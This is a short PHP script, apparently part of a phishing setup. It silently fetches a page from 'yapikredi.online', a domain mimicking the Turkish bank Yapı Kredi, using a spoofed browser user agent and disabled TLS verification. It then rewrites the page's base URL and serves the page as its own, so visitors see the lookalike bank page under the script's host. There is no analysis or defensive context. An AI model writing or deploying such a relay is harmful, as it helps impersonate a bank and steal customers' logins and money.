<?php
error_reporting(0);

$offerUrl = 'https://yapikredi.online/';

function offer_stream_context()
{
    return stream_context_create([
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
        ],
        'http' => [
            'header' =>
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36\r\n" .
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" .
                "Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7\r\n",
            'timeout' => 20,
        ],
    ]);
}

$html = @file_get_contents($offerUrl, false, offer_stream_context());

if ($html === false || $html === '') {
    header('HTTP/1.1 502 Bad Gateway');
    exit('Geçici olarak hizmet verilemiyor.');
}

$base = htmlspecialchars(rtrim($offerUrl, '/') . '/', ENT_QUOTES, 'UTF-8');
$html = preg_replace('/<head([^>]*)>/i', '<head$1><base href="' . $base . '" />', $html, 1);

echo $html;
